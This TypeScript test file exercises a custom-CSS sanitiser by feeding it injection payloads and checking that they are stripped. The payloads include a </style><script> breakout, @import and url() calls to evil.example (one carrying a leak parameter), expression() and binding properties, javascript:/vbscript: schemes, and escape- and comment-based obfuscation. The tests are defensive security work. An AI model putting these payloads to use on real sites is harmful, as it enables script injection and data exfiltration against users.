import test from "node:test";
import assert from "node:assert/strict";
import { sanitizeCustomCss } from "./css-sanitize";

// E-9 (custom CSS fast-follow) — the sanitiser is the security boundary, so it
// gets the most adversarial coverage.

test("keeps benign layout/colour CSS intact", () => {
  const css = ".card { border-radius: 14px; color: #0f766e; }";
  assert.equal(sanitizeCustomCss(css), css);
});

test("non-strings and blanks become null", () => {
  assert.equal(sanitizeCustomCss(undefined), null);
  assert.equal(sanitizeCustomCss(123), null);
  assert.equal(sanitizeCustomCss("   "), null);
  assert.equal(sanitizeCustomCss("/* only a comment */"), null);
});

test("strips angle brackets so </style> cannot break out into HTML", () => {
  const out = sanitizeCustomCss("a{}</style><script>alert(1)</script>");
  assert.ok(out !== null);
  assert.doesNotMatch(out!, /[<>]/);          // no angle brackets at all
  assert.doesNotMatch(out!, /<\/?script/i);   // and therefore no usable tag
});

test("removes @import (and other remote-fetching at-rules)", () => {
  const out = sanitizeCustomCss('@import url("https://evil.example/x.css"); .a{color:red}');
  assert.doesNotMatch(out ?? "", /@import/i);
  assert.match(out ?? "", /\.a\{color:red\}/);
});

test("removes url() — the CSS network / exfiltration channel", () => {
  const out = sanitizeCustomCss('.a{background:url(https://evil.example/leak?d=1)} .b{color:blue}');
  assert.doesNotMatch(out ?? "", /url\s*\(/i);
  assert.match(out ?? "", /\.b\{color:blue\}/);
});

test("removes expression() and script-binding properties", () => {
  const out = sanitizeCustomCss(".a{width:expression(alert(1)); behavior:url(x.htc); -moz-binding:url(x.xml)}");
  assert.doesNotMatch(out ?? "", /expression\s*\(/i);
  assert.doesNotMatch(out ?? "", /behavior\s*:/i);
  assert.doesNotMatch(out ?? "", /-moz-binding/i);
});

test("strips javascript:/vbscript: schemes", () => {
  const out = sanitizeCustomCss(".a{x:javascript:alert(1)} .b{y:vbscript:msgbox}");
  assert.doesNotMatch(out ?? "", /javascript:/i);
  assert.doesNotMatch(out ?? "", /vbscript:/i);
});

test("obfuscation via comments inside keywords does not survive as a live keyword", () => {
  // Comments are stripped first, so "@imp/* */ort" must not reassemble into @import.
  const out = sanitizeCustomCss('@imp/* x */ort url("https://evil.example/x.css"); .a{color:red}');
  assert.doesNotMatch(out ?? "", /@import/i);
  assert.doesNotMatch(out ?? "", /url\s*\(/i);
});

test("strips backslashes so CSS escapes can't reconstitute url()/@import", () => {
  // "\75 rl(" is the escaped form of url( — after backslash removal it can no
  // longer be parsed as the url() function, and no backslash survives.
  const out = sanitizeCustomCss(String.raw`.a{background:\75 rl(https://evil/leak)} .b{color:blue}`);
  assert.doesNotMatch(out ?? "", /\\/);
  assert.doesNotMatch(out ?? "", /url\s*\(/i);
  assert.match(out ?? "", /\.b\{color:blue\}/);

  const imp = sanitizeCustomCss(String.raw`@\69 mport "https://evil/x.css"; .a{color:red}`);
  assert.doesNotMatch(imp ?? "", /\\/);
  assert.doesNotMatch(imp ?? "", /@import/i);
});

test("caps length to bound the payload", () => {
  const huge = ".a{color:red}".repeat(5000); // ~65k chars
  const out = sanitizeCustomCss(huge);
  assert.ok(out !== null);
  assert.ok(out!.length <= 20_000);
});
